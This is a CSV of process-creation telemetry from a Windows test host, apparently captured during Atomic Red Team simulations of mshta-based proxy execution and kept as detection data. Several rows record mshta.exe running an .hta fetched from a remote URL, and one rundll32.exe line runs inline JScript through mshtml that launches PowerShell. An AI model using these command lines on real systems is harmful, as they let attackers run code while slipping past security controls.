guid:ID(Process),pid:int,commandLine,user,name,imagePath
e339b6fe-d593-68d4-d616-000000000a00,11876,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\windows\AppData\Local\Temp\RESD9C9.tmp"" ""c:\Users\windows\AppData\Local\Temp\d5bj4dfr\CSC3EE5B108C432486D8ECEA8B355BD5D3.TMP""",WIN-Q5K8V1QHISE\windows,cvtres.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
e339b6fe-d593-68d4-d716-000000000a00,3332,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\windows\AppData\Local\Temp\f3t3rmmi\f3t3rmmi.cmdline""",WIN-Q5K8V1QHISE\windows,csc.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
e339b6fe-d593-68d4-d816-000000000a00,3000,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\windows\AppData\Local\Temp\RESDA27.tmp"" ""c:\Users\windows\AppData\Local\Temp\f3t3rmmi\CSC59C3A80A66114FEABD38BEE53A5F7FC.TMP""",WIN-Q5K8V1QHISE\windows,cvtres.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
e339b6fe-d593-68d4-d916-000000000a00,1924,C:\Windows\System32\mshta.exe -Embedding,WIN-Q5K8V1QHISE\windows,mshta.exe,C:\Windows\System32\mshta.exe
e339b6fe-d593-68d4-da16-000000000a00,11040,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -Command Write-Host ee87231e-2319-496f-828a-52daa6afb36a; Start-Sleep -Seconds 2; exit",WIN-Q5K8V1QHISE\windows,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
e339b6fe-d594-68d4-dc16-000000000a00,8180,"""powershell.exe"" & {Invoke-ATHHTMLApplication -HTAFilePath Test.hta -ScriptEngine JScript -SimulateUserDoubleClick}",WIN-Q5K8V1QHISE\windows,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
e339b6fe-d594-68d4-dd16-000000000a00,,,WIN-Q5K8V1QHISE\windows,conhost.exe,C:\Windows\System32\conhost.exe
e339b6fe-d595-68d4-de16-000000000a00,13132,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\windows\AppData\Local\Temp\uwo3jcuo\uwo3jcuo.cmdline""",WIN-Q5K8V1QHISE\windows,csc.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
e339b6fe-d595-68d4-df16-000000000a00,13028,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\windows\AppData\Local\Temp\RESE0ED.tmp"" ""c:\Users\windows\AppData\Local\Temp\uwo3jcuo\CSCE00995E67A12481EB5464FCB88A7185.TMP""",WIN-Q5K8V1QHISE\windows,cvtres.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
e339b6fe-d595-68d4-e016-000000000a00,11964,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\windows\AppData\Local\Temp\1tl1qqdz\1tl1qqdz.cmdline""",WIN-Q5K8V1QHISE\windows,csc.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
e339b6fe-d595-68d4-e116-000000000a00,5328,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\windows\AppData\Local\Temp\RESE12B.tmp"" ""c:\Users\windows\AppData\Local\Temp\1tl1qqdz\CSC1C7EF4EFB9A5418189C44F9B587FDB.TMP""",WIN-Q5K8V1QHISE\windows,cvtres.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
e339b6fe-d595-68d4-e216-000000000a00,7884,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\windows\AppData\Local\Temp\ght0yvlm\ght0yvlm.cmdline""",WIN-Q5K8V1QHISE\windows,csc.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
e339b6fe-d595-68d4-e316-000000000a00,,,WIN-Q5K8V1QHISE\windows,docker.exe,C:\Program Files\Docker\Docker\resources\bin\docker.exe
e339b6fe-d595-68d4-e416-000000000a00,,,WIN-Q5K8V1QHISE\windows,docker.exe,C:\Program Files\Docker\Docker\resources\bin\docker.exe
e339b6fe-d595-68d4-e516-000000000a00,4320,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\windows\AppData\Local\Temp\RESE16A.tmp"" ""c:\Users\windows\AppData\Local\Temp\ght0yvlm\CSCE62CC8BBF4EC43BCA17C4E824CD768E.TMP""",WIN-Q5K8V1QHISE\windows,cvtres.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
e339b6fe-d595-68d4-e816-000000000a00,,,WIN-Q5K8V1QHISE\windows,conhost.exe,C:\Windows\System32\conhost.exe
e339b6fe-d595-68d4-e916-000000000a00,,,WIN-Q5K8V1QHISE\windows,conhost.exe,C:\Windows\System32\conhost.exe
e339b6fe-d595-68d4-ea16-000000000a00,13060,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\windows\AppData\Local\Temp\kzc5rdgi\kzc5rdgi.cmdline""",WIN-Q5K8V1QHISE\windows,csc.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
e339b6fe-d595-68d4-eb16-000000000a00,12872,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\windows\AppData\Local\Temp\RESE1B8.tmp"" ""c:\Users\windows\AppData\Local\Temp\kzc5rdgi\CSCDD0F3127F1F49028FB9574F7B137CF7.TMP""",WIN-Q5K8V1QHISE\windows,cvtres.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
e339b6fe-d595-68d4-ec16-000000000a00,1972,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\windows\AppData\Local\Temp\z5oold1v\z5oold1v.cmdline""",WIN-Q5K8V1QHISE\windows,csc.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
e339b6fe-d595-68d4-ed16-000000000a00,10476,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\windows\AppData\Local\Temp\RESE206.tmp"" ""c:\Users\windows\AppData\Local\Temp\z5oold1v\CSCAED591DEC13947469F9AD74BE894FC34.TMP""",WIN-Q5K8V1QHISE\windows,cvtres.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
e339b6fe-d595-68d4-ee16-000000000a00,7856,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\windows\AppData\Local\Temp\i4qjstwl\i4qjstwl.cmdline""",WIN-Q5K8V1QHISE\windows,csc.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
e339b6fe-d595-68d4-ef16-000000000a00,4080,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\windows\AppData\Local\Temp\RESE245.tmp"" ""c:\Users\windows\AppData\Local\Temp\i4qjstwl\CSC6C3DBEC1B77E4A21B644577C5BB25967.TMP""",WIN-Q5K8V1QHISE\windows,cvtres.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
e339b6fe-d595-68d4-f016-000000000a00,1476,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\windows\AppData\Local\Temp\rn0e2oev\rn0e2oev.cmdline""",WIN-Q5K8V1QHISE\windows,csc.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
e339b6fe-d595-68d4-f116-000000000a00,11756,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\windows\AppData\Local\Temp\RESE2A2.tmp"" ""c:\Users\windows\AppData\Local\Temp\rn0e2oev\CSC86A7525F3BF4FDDA7307DF19441B786.TMP""",WIN-Q5K8V1QHISE\windows,cvtres.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
e339b6fe-d595-68d4-f216-000000000a00,12356,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\windows\AppData\Local\Temp\1wmjoxdh\1wmjoxdh.cmdline""",WIN-Q5K8V1QHISE\windows,csc.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
e339b6fe-d595-68d4-f316-000000000a00,4404,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\windows\AppData\Local\Temp\RESE300.tmp"" ""c:\Users\windows\AppData\Local\Temp\1wmjoxdh\CSC9D1D6FA62C69413BBD808A8989135F14.TMP""",WIN-Q5K8V1QHISE\windows,cvtres.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
e339b6fe-d595-68d4-f516-000000000a00,12388,"C:\WINDOWS\explorer.exe /factory,{75dff2b7-6936-4c06-a8bb-676a7b00b24b} -Embedding",WIN-Q5K8V1QHISE\windows,explorer.exe,C:\Windows\explorer.exe
e339b6fe-d595-68d4-f616-000000000a00,7368,"""C:\Windows\SysWOW64\mshta.exe"" ""C:\Users\windows\AppData\Local\Temp\Test.hta"" {1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5} ",WIN-Q5K8V1QHISE\windows,mshta.exe,C:\Windows\SysWOW64\mshta.exe
e339b6fe-d596-68d4-f716-000000000a00,11132,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -Command Write-Host aa6cf395-ae3c-45ff-b0b4-ee65f4813032; Start-Sleep -Seconds 2; exit",WIN-Q5K8V1QHISE\windows,powershell.exe,C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
e339b6fe-d596-68d4-f816-000000000a00,,,WIN-Q5K8V1QHISE\windows,conhost.exe,C:\Windows\System32\conhost.exe
e339b6fe-d597-68d4-0017-000000000a00,7556,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\windows\AppData\Local\Temp\RESEA44.tmp"" ""c:\Users\windows\AppData\Local\Temp\efnxmx3l\CSCA650F29F71848D9B6D6AED24E86543.TMP""",WIN-Q5K8V1QHISE\windows,cvtres.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
e339b6fe-d597-68d4-0117-000000000a00,11812,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\windows\AppData\Local\Temp\2n33yq2x\2n33yq2x.cmdline""",WIN-Q5K8V1QHISE\windows,csc.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
e339b6fe-d597-68d4-0217-000000000a00,8852,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\windows\AppData\Local\Temp\RESEA82.tmp"" ""c:\Users\windows\AppData\Local\Temp\2n33yq2x\CSCEA5800CBB59F4F62B469CB6EE65677CC.TMP""",WIN-Q5K8V1QHISE\windows,cvtres.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
e339b6fe-d597-68d4-0317-000000000a00,1492,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\windows\AppData\Local\Temp\jmc3jgad\jmc3jgad.cmdline""",WIN-Q5K8V1QHISE\windows,csc.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
e339b6fe-d597-68d4-0417-000000000a00,12980,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\windows\AppData\Local\Temp\RESEAD0.tmp"" ""c:\Users\windows\AppData\Local\Temp\jmc3jgad\CSCA4B1F56EF38442E2B56C6EF34C1780F8.TMP""",WIN-Q5K8V1QHISE\windows,cvtres.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
e339b6fe-d597-68d4-0517-000000000a00,11108,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\windows\AppData\Local\Temp\mumj3cir\mumj3cir.cmdline""",WIN-Q5K8V1QHISE\windows,csc.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
e339b6fe-d597-68d4-0617-000000000a00,11852,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\windows\AppData\Local\Temp\RESEB0F.tmp"" ""c:\Users\windows\AppData\Local\Temp\mumj3cir\CSC531246C0F52D49E4833DADF18FB542.TMP""",WIN-Q5K8V1QHISE\windows,cvtres.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
e339b6fe-d597-68d4-0717-000000000a00,10440,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\windows\AppData\Local\Temp\1jwj2u4m\1jwj2u4m.cmdline""",WIN-Q5K8V1QHISE\windows,csc.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
e339b6fe-d597-68d4-0817-000000000a00,11388,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\windows\AppData\Local\Temp\RESEB6C.tmp"" ""c:\Users\windows\AppData\Local\Temp\1jwj2u4m\CSCD34EE737CC6848F4844E277C59DCBCC.TMP""",WIN-Q5K8V1QHISE\windows,cvtres.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
e339b6fe-d597-68d4-0917-000000000a00,12252,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\windows\AppData\Local\Temp\3vvge4q1\3vvge4q1.cmdline""",WIN-Q5K8V1QHISE\windows,csc.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
e339b6fe-d597-68d4-0a17-000000000a00,4952,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\windows\AppData\Local\Temp\RESEBDA.tmp"" ""c:\Users\windows\AppData\Local\Temp\3vvge4q1\CSC24607AACACC9436BA11A60EFD5BCF63.TMP""",WIN-Q5K8V1QHISE\windows,cvtres.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
e339b6fe-d597-68d4-0b17-000000000a00,12096,"""C:\WINDOWS\system32\mshta.exe"" ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta""",WIN-Q5K8V1QHISE\windows,mshta.exe,C:\WINDOWS\system32\mshta.exe
e339b6fe-d597-68d4-f916-000000000a00,1328,"""powershell.exe"" & {Invoke-ATHHTMLApplication -HTAUri https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta -MSHTAFilePath $env:windir\system32\mshta.exe}",WIN-Q5K8V1QHISE\windows,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
e339b6fe-d597-68d4-fb16-000000000a00,12020,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\windows\AppData\Local\Temp\fxpi5qxh\fxpi5qxh.cmdline""",WIN-Q5K8V1QHISE\windows,csc.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
e339b6fe-d597-68d4-fc16-000000000a00,988,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\windows\AppData\Local\Temp\RESE9C7.tmp"" ""c:\Users\windows\AppData\Local\Temp\fxpi5qxh\CSC76750BF2F8AF49B6A4E2E098CF8A4B36.TMP""",WIN-Q5K8V1QHISE\windows,cvtres.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
e339b6fe-d597-68d4-fd16-000000000a00,10032,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\windows\AppData\Local\Temp\b2gsuobm\b2gsuobm.cmdline""",WIN-Q5K8V1QHISE\windows,csc.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
e339b6fe-d597-68d4-ff16-000000000a00,9028,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\windows\AppData\Local\Temp\efnxmx3l\efnxmx3l.cmdline""",WIN-Q5K8V1QHISE\windows,csc.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
e339b6fe-d598-68d4-0c17-000000000a00,11932,"""powershell.exe"" & {Invoke-ATHHTMLApplication -ScriptEngine JScript -InlineProtocolHandler About -UseRundll32 -Rundll32FilePath $env:windir\system32\rundll32.exe}",WIN-Q5K8V1QHISE\windows,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
e339b6fe-d598-68d4-0e17-000000000a00,13200,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\windows\AppData\Local\Temp\desytjwv\desytjwv.cmdline""",WIN-Q5K8V1QHISE\windows,csc.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
e339b6fe-d598-68d4-0f17-000000000a00,10656,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\windows\AppData\Local\Temp\RESEE0C.tmp"" ""c:\Users\windows\AppData\Local\Temp\desytjwv\CSC403C6CE68DD9487685528073B23848CB.TMP""",WIN-Q5K8V1QHISE\windows,cvtres.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
e339b6fe-d598-68d4-1017-000000000a00,11076,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\windows\AppData\Local\Temp\l5ilfdp2\l5ilfdp2.cmdline""",WIN-Q5K8V1QHISE\windows,csc.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
e339b6fe-d598-68d4-1117-000000000a00,2404,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\windows\AppData\Local\Temp\RESEE4B.tmp"" ""c:\Users\windows\AppData\Local\Temp\l5ilfdp2\CSC66073EC774C947D7B15D733CDACD35.TMP""",WIN-Q5K8V1QHISE\windows,cvtres.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
e339b6fe-d598-68d4-1217-000000000a00,3544,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\windows\AppData\Local\Temp\g4w5ngs4\g4w5ngs4.cmdline""",WIN-Q5K8V1QHISE\windows,csc.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
e339b6fe-d598-68d4-1317-000000000a00,10484,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\windows\AppData\Local\Temp\RESEE7A.tmp"" ""c:\Users\windows\AppData\Local\Temp\g4w5ngs4\CSCC969D1C31ABD4129844F214BED5D171B.TMP""",WIN-Q5K8V1QHISE\windows,cvtres.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
e339b6fe-d598-68d4-1417-000000000a00,10248,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\windows\AppData\Local\Temp\ic04w5qq\ic04w5qq.cmdline""",WIN-Q5K8V1QHISE\windows,csc.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
e339b6fe-d598-68d4-1517-000000000a00,9820,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\windows\AppData\Local\Temp\RESEEC8.tmp"" ""c:\Users\windows\AppData\Local\Temp\ic04w5qq\CSCE6CF68F31C648A99A9A257531E5EAEC.TMP""",WIN-Q5K8V1QHISE\windows,cvtres.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
e339b6fe-d598-68d4-1617-000000000a00,4696,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\windows\AppData\Local\Temp\0ac2ql0p\0ac2ql0p.cmdline""",WIN-Q5K8V1QHISE\windows,csc.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
e339b6fe-d598-68d4-1717-000000000a00,9008,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\windows\AppData\Local\Temp\RESEF06.tmp"" ""c:\Users\windows\AppData\Local\Temp\0ac2ql0p\CSC86DB3B1770BE43648C83CB6125FD427A.TMP""",WIN-Q5K8V1QHISE\windows,cvtres.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
e339b6fe-d598-68d4-1817-000000000a00,9156,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\windows\AppData\Local\Temp\lkr5445c\lkr5445c.cmdline""",WIN-Q5K8V1QHISE\windows,csc.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
e339b6fe-d598-68d4-1917-000000000a00,13008,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\windows\AppData\Local\Temp\RESEF45.tmp"" ""c:\Users\windows\AppData\Local\Temp\lkr5445c\CSCA2ADACF28CFC4F79B6638240CA7E688.TMP""",WIN-Q5K8V1QHISE\windows,cvtres.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
e339b6fe-d598-68d4-1a17-000000000a00,8888,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\windows\AppData\Local\Temp\e3tiatxh\e3tiatxh.cmdline""",WIN-Q5K8V1QHISE\windows,csc.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
e339b6fe-d598-68d4-1b17-000000000a00,8280,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\windows\AppData\Local\Temp\RESEFA3.tmp"" ""c:\Users\windows\AppData\Local\Temp\e3tiatxh\CSCF55939CCA27B4C8FBB63BDF47F7325A5.TMP""",WIN-Q5K8V1QHISE\windows,cvtres.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
e339b6fe-d598-68d4-1c17-000000000a00,6972,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\windows\AppData\Local\Temp\oq1gxahe\oq1gxahe.cmdline""",WIN-Q5K8V1QHISE\windows,csc.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
e339b6fe-d598-68d4-1d17-000000000a00,4336,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\windows\AppData\Local\Temp\RESF000.tmp"" ""c:\Users\windows\AppData\Local\Temp\oq1gxahe\CSC63E567275E9414A9B752AB1869FA8.TMP""",WIN-Q5K8V1QHISE\windows,cvtres.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
e339b6fe-d599-68d4-1e17-000000000a00,11088,"""C:\WINDOWS\system32\rundll32.exe"" about:""\..\mshtml,RunHTMLApplication ""%%3Chta:application%%3E%%3Cscript%%20language=""JScript""%%3Ea=new%%20ActiveXObject(""WScript.Shell"");a.Run(""powershell.exe%%20-nop%%20-Command%%20Write-Host%%2056c4978c-30bd-46b4-b581-914bb147cb71;%%20Start-Sleep%%20-Seconds%%202;%%20exit"",0,true);close();%%3C/script%%3E",WIN-Q5K8V1QHISE\windows,rundll32.exe,C:\Windows\System32\rundll32.exe
e339b6fe-d599-68d4-1f17-000000000a00,11560,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -Command Write-Host 56c4978c-30bd-46b4-b581-914bb147cb71; Start-Sleep -Seconds 2; exit",WIN-Q5K8V1QHISE\windows,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
e339b6fe-d59a-68d4-2117-000000000a00,11848,"""powershell.exe"" & {Invoke-ATHHTMLApplication -ScriptEngine JScript -InlineProtocolHandler About -MSHTAFilePath $env:windir\system32\mshta.exe}",WIN-Q5K8V1QHISE\windows,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
e339b6fe-d59a-68d4-2217-000000000a00,,,WIN-Q5K8V1QHISE\windows,conhost.exe,C:\Windows\System32\conhost.exe
e339b6fe-d59a-68d4-2317-000000000a00,13128,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\windows\AppData\Local\Temp\ivitcyua\ivitcyua.cmdline""",WIN-Q5K8V1QHISE\windows,csc.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
e339b6fe-d59a-68d4-2517-000000000a00,5380,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\windows\AppData\Local\Temp\s2ri1hh2\s2ri1hh2.cmdline""",WIN-Q5K8V1QHISE\windows,csc.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
